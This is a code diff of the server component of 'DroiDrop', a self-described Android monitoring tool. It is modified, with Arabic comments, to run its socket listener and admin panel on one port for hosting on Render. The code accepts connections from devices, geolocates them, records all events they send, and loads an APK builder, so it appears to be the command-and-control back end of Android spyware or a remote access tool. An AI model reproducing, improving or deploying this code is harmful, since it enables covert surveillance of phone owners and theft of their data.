@@ -1,20 +1,22 @@
-/* 
-*   DroiDrop
-*   An Android Monitoring Tools
-*   By t.me/efxtv
+/* * DroiDrop (Modified for Render)
+* An Android Monitoring Tools
+* By t.me/efxtv
 */
-
 
 const
     express = require('express'),
     app = express(),
-    IO = require('socket.io'),
+    http = require('http').Server(app), // إنشاء سيرفر HTTP لدمج الأداة
+    IO = require('socket.io')(http),    // ربط Socket.io بسيرفر الويب
     geoip = require('geoip-lite'),
     CONST = require('./includes/const'),
     db = require('./includes/databaseGateway'),
     logManager = require('./includes/logManager'),
     clientManager = new (require('./includes/clientManager'))(db),
     apkBuilder = require('./includes/apkBuilder');
+
+// إعداد المنفذ ليتوافق مع Render
+const PORT = process.env.PORT || 10000;
 
 global.CONST = CONST;
 global.db = db;
@@ -23,11 +25,9 @@ global.app = app;
 global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
-// spin up socket server
-let client_io = IO.listen(CONST.control_port);
-
-client_io.sockets.pingInterval = 30000;
-client_io.on('connection', (socket) => {
+// إعدادات الاتصال (Socket.io)
+IO.sockets.pingInterval = 30000;
+IO.on('connection', (socket) => {
     socket.emit('welcome');
     let clientParams = socket.handshake.query;
     let clientAddress = socket.request.connection;
@@ -50,9 +50,9 @@ client_io.on('connection', (socket) => {
         var onevent = socket.onevent;
         socket.onevent = function (packet) {
             var args = packet.data || [];
-            onevent.call(this, packet);    // original call
+            onevent.call(this, packet);    
             packet.data = ["*"].concat(args);
-            onevent.call(this, packet);      // additional call to catch-all
+            onevent.call(this, packet);      
         };
 
         socket.on("*", function (event, data) {
@@ -60,20 +60,15 @@ client_io.on('connection', (socket) => {
             console.log(data);
         });
     }
-
 });
 
-
-// get the admin interface online
-app.listen(CONST.web_port);
-
-/* 
-*   
-*   
-*   t.me/efxtv
-*/
-
+// إعدادات واجهة الإدارة والمسارات
 app.set('view engine', 'ejs');
 app.set('views', './assets/views');
 app.use(express.static(__dirname + '/assets/webpublic'));
 app.use(require('./includes/expressRoutes'));
+
+// تشغيل السيرفر الموحد على منفذ Render
+http.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+});
